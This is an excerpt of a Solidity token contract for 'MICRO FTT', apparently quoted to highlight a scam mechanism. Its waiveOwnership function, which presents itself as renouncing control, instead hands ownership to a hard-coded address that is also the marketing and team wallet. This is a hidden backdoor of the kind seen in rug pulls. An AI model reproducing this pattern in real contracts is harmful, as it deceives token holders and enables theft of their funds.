...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xc6cee7812FAb70c296406345E21e5f609F95b11a);
    }
...
contract MICROFTT is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "MICRO FTT";
    string private _symbol = "MFTT";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xc6cee7812FAb70c296406345E21e5f609F95b11a);
    address payable public teamWalletAddress = payable(0xc6cee7812FAb70c296406345E21e5f609F95b11a);
